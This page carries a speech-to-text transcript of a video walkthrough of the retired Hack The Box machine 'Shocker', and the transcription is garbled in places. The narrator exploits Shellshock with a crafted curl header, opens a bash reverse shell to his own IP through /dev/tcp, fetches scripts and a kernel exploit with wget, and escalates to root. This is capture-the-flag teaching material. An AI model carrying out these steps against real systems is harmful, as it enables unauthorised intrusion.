<!DOCTYPE html><html lang="en"><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-114897551-4"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-114897551-4');
</script><script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=5ac2443d1fff98001395ab6c&amp;product=sticky-share-buttons" async="async"></script><title>Shocker - HTB - Walkthrough - Exploiting a Widespread Vulnerability | Coder Coacher - Coaching Coders</title><meta content="Shocker - HTB - Walkthrough - Exploiting a Widespread Vulnerability - All technical stuff in one place" name="description"><meta name="keywords" content="education, coding, programming, technology, nodejs, mongodb, software, computer science, engineering, teaching, coaching, coder, learning, java, kotlin, machine learning, AI, ML, tech talks, angular, javascript, js, typescript"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/bootstrap.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/coder-coacher.css"></head><body><div class="container-fluid"><h1 class="site-title"><a href="/">Coder Coacher</a></h1><hr><h4 class="site-subtitle text-right">Coaching Coders</h4></div><div id="amzn-assoc-ad-99d6751e-2392-4004-ad16-73aa8385d9d0"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=99d6751e-2392-4004-ad16-73aa8385d9d0"></script><div class="post__breadcrumb"><div class="container"><ol class="breadcrumb"><li><a href="/">Coder Coacher</a></li><li><a href="/Cristi-Vlad/">Cristi Vlad</a></li><li class="active">â¤µ</li></ol></div></div><h2 class="post__title"><b>Shocker - HTB - Walkthrough - Exploiting a Widespread Vulnerability</b></h2><h5 class="post__date">2018-04-20</h5><div class="container"><div class="video-responsive"><iframe width="560" height="315" src="https://www.youtube.com/embed/ovyJxDrB3C8" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div><div class="post__text">in this video we're gonna go through
another walkthrough so I'm gonna make a
demonstration for a vulnerable machine
that's that's on hack the box so this
machine is chakra so at the moment of
this recording chakra is part of the
retired machines so from what I know you
are allowed to do write ups or
walkthroughs for retired machines but
you should not be doing
write up for active machines which from
what I know is against the guidelines of
hack the box anyway so we have our so
first things first it was relatively
easy to own this machine and it took me
a little time but I got stung stumbled
upon for a while in reconnaissance so
I'm gonna explain that in a bit
so we have our IP 10 10 10 56 and I
gotta say that I kind of circumvented
the process of owning this machine so I
didn't go all the way through
enumeration and all that stuff I just
like blasted through once I once I got
inside the server
I actually immediately escalated my
privileges to move but more about that
in a minute
so Tenten then then 56 that's our target
so we have our info dot txt which is
what I'm always doing so forth any kind
of assessment for any kind of
cybersecurity assessment that I'm doing
I'm actually writing this and right
actually writing everything down so
every step of the assessment and every
and any kind of information that I get
from the assessment is written down and
and just a simple note that simple leaf
band file and I have to say that it is
always this is always a very good
practice because we will help create a
report and hand that report to the ones
that requested the assessment so the
ones that requested the security
assessment from you or even it would be
useful even even to you in later
assessments you could always come back
at it and see if you could replicate
some of the steps or use some
information from the report to build
build another assessment so anyhow the
first thing that I always do is a simple
a map as we scan so time time time 56
and after I run this simple scan I
usually do a more thorough scan which is
so let me write it down
six followed by and math so then nmap
minus P which is for all ports minus 5
which is aggressive and if you want to
run a stealthy scandal oligo d0 or a
different nmap scan but this time we're
not actually we don't care about how
much or how aggressive we are in terms
of loudness of hours cancer I could also
say - a but you know actually it's not
really necessary to specify that - a I
guess is stands for addressed I'm not
sure but d5 is probably the highest
level so - B for all ports or you could
just say minus b0 sixty five thousand
five
the number of all possible ports
well let's just say that so - d5 and
then our 1986 we could output this the
use away
that we want to output it or if we just
run this it'll simply run in the window
we have so let's save this for now so we
see that we have an Apache server
running we go to our web server it says
don't bug me okay now as someone has
specified in a previous video if you
just control you to see the source so
it's control what you see the source and
there isn't anything interesting in here
so don't don't bug me we could keep this
in mind
next next what I did was to run a verb
to HTTP 1010 1056 with the word list
user share word list their word lists I
guess they're big dot txt and this took
about a couple of minutes so big dot txt
is 20,000 words long big dot txt found
so there with big dot txt it found CGI
then so the CGI Bend Iraq okay so
knowing that we have the CGI bin and
also the name of the box which is
shocker and we have the don't bog me
over here should probably bring some
alarms anyhow this is the point where I
got a bit like delayed so syrup actually
told me about the CGI bin but I didn't
take that into account and I tried
brute-forcing directories with with a
bigger list with a bigger word list
so I actually tried with directory list
2.3 medium dot txt I guess and I didn't
find anything
so that list is probably 200,000 I guess
or 80,000 are not really short 80 or
200,000 words long and I didn't actually
find anything and it took I don't know
maybe an hour to run it so then I
thought okay so if we have this CGI bin
and that's the moment when it kind of
clicked so we have the CGI bin directly
so let me I'll just leave it for and
maybe one or two more minutes so we have
the CGI bin directory and the name of
the box is chakra and we have the dumb
bug me over here so this should probably
tell us that it might have something to
do with the very popular exploit that
was revealed in a very popular
vulnerability that was revealed in 2014
I guess which is as you may guess the
shell-shocked vulnerability and if you
don't know about it I'd recommend
reading this presentation by your Nakia
which I guess is a Romanian
fellow who emigrated or works for
someone in the Emirates anyway so this
presentation at all of VAS open web
application I don't know what open web
application security project explains
the shellshock corner ability so I'm
gonna try to keep it short so in short
the shellshock has been standing around
or so this vulnerability has been
standing around for more than I guess 20
years at the time that it was discovered
and it allows if you have a web server
with CGI enabled it could allow for
remote command execution so that's when
I thought if we have the CGI bin which
was found by Big D XD and which I
ignored thereafter we could try looking
for scripts inside CGI bin to see if we
could get a remote command execution
that I want so at the moment I thought
of let me try and run the same Derb scan
but this time in the CGI bin directory
and with the extension so I want her to
look for dot SH so not only for
directory names but also for extensions
so whatever whatever it scans for it
doubles the skin to a stage so whatever
world is inside the big txt it will not
only look for it as a directory but also
as an extension so as you can see
extensions list is done Sh
so this took probably maybe fifteen
minutes until I got after 15 minutes I
got the CGI then user or yeah I guess it
was user dot SH okay so at this point I
kind of felt that I'm lucky so next what
I tried was to actually see if this is
vulnerable to to shell shock I could
have simply just so we can see that it
is poor then and if we go to user dot SH
it will probably want to download it
which is not what we want we want to
access we want to access it through
something like so we want to be able to
modify the headers so that we can see if
this is exploitable and we could do that
with either two of the most convenient
options would be curl and another one
would be pursuit so with the ultra
popular bird which I start to get
familiar with
I hated it until a couple of weeks ago
anyhow so probably the most simple is
using curl and first option is - V for
verbose I guess let's see oh hope - bees
for verbose yeah so curl - V our path
HTTP we have 1010 1056 cgi-bin our user
just make this a little bigger so CGI
user dot sh and we we want to modify the
headers so here's where the actual
exploit goes on so it's custom
ignored
and you wanna say echo so over here this
is actually the shellshock exploit and
then we echo we could also say content
type over here text HTML but it works if
we simply echo and then let's say then
cat and see password I want to make sure
that this looks good let's see yeah so
it works so this is vulnerable to the
shell shock exploit so once again custom
ignored echo then cat at sea bass so we
have remote command execution so as I
wanted to circumvent the process the
first thing before getting a reverse
shell any kind of reverse shell was to
see what's inside the home directory so
I just did then LS home and we can see
shally over here let's just say LS - a
town
so it's shout then inside Shelley let's
say what's inside Shelley we have our
user flag let's just read that so user
dot txt and we modify the command it's
not as it's cat
there's our user flag control shift C
paste it over here so user let's say
shall we
and that was flag and the next thing
that I want to do was to try to get the
simplest shell on the server and you can
do that directly through remote command
execution and you just called then bash
this is probably one of the easiest
verse shouts - I def TCP TCP and my IP
so if config my IP is 10 10 14 14 so 10
10 14 14 and the port let's say 4 4 9 0
greater than end 1 &amp;amp; 1
so before we run this we should set up a
netcat listener to that port so and see
- LVP 4 4 9 and then we run this ok so
looks like we have a shell on the server
that's UID or ID okay and once I got
here I didn't actually look for anything
but the name do you name - a and when I
saw 4 4 0 96 I thought of a of a recent
exploit and I'm going to talk about that
in a minute but first let's let's see
how you would do it conventionally when
you run an assessment and you want to
gather as much information as possible
so I'm going to CD into them and I'm
also gonna run so LS - any I'm also
gonna run so I also have the bug that
jpg I looked inside it to see if there's
some sort of anything hidden inside the
image like some sort of I don't know
information hidden with access to or
something like that
like steganography thing which I don't
like at the moment so I simply run a
Python - and simple HTTP server on board
49
and I would get one or more of these
files from from there so I would W get
10 14 14 449 Lin Anandi Sh
then I would get 10 10 14 14 Lin Prez
Dottie why I would also get the exploits
a gesture said gesture so W get 10 10 10
10 10 14 14 49 expl sugs H so these will
allow for in that reconnaissance of the
target exploits a gesture would probably
would actually suggest exploits based on
the information it gets from the system
Lin and um and Lin Prive are two scripts
one of one of it as the Python and one
of it is bash which all of you are
probably familiar with anyhow so what I
did was to as you can see I also
downloaded the for 4219 so this is an
exploit that's just been released last
month so in March and I guess most Linux
kernels before this version are
exploitable so what I did was to
download it on my local machine I didn't
actually look if it has GCC or cc it
doesn't so anyhow
it is on my machine and I compiled it so
GCC for 4 to 9 8 points E - oh four four
two nine eight
so we have the compiled version of it
and this is somehow so the version of my
Kelly is compatible with so the systems
are compatible which is why it allowed
me to actually run to run it compiled on
our target so I got it ten ten ten ten
ten 14 14 port 49 I guess and four four
two nine eight but I already have it
here
so first before running it I think I
actually have to get out of this dirty
shell I would call it so how do we do
that using Python but I'm not sure if it
has Python or Python 3 so if will run
Python 3 I guess it has the Python 3 ok
so python 3 c import ET i PT i spawn
we're gonna get out of this shell then
bash okay so we're out of the shell and
this is the fun part in the easy part
so I'm gonna change mode + X - 4 4 - 9 8
and right now I'm Shelley and I'm just
gonna run this one easy as that
we are grouped ID root CD 2 root OS - 8l
cat txt and there's our root flag
so roots ctrl-v and that's done my
reports are usually like I don't know
maybe 50 or 60 line long at least 50 or
60 lines longer so this one was this one
was really easy as you can see so right
now we are rude and we can do anything
on this box what I want to point out is
that I know maybe this box would would
have been really interesting if I would
try to I don't know exploit it or
escalate my privileges conventionally
maybe I would have learned a lot but I
don't know I also try other vectors of
attack if I have time and if I'm
interested in doing it with this box but
I want to point out is that when you
have so powerful exploits you should
always check your system if you're a
network administrator you should always
check your system to see if you're
vulnerable to these exploits and apply
all the patches and all the updates
necessary to kind of remove your
vulnerability to that exploit anyhow if
you enjoyed this video please give it a
thumbs up and subscribe to the channel
and if you want to see more
cybersecurity penetration testing and
offensive security related videos let me
know in the comment sections below thank
you for watching</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-6a809dda-347a-4187-8a86-91faf94575da"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=6a809dda-347a-4187-8a86-91faf94575da"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
    var b = d.getElementsByTagName('body')[0];
    var s = d.createElement("script"); s.async = true;
    var v = !("IntersectionObserver" in w) ? "8.6.0" : "10.4.2";
    s.src = "https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/" + v + "/lazyload.min.js";
    w.lazyLoadOptions = {};
    b.appendChild(s);
}(window, document));</script></body></html>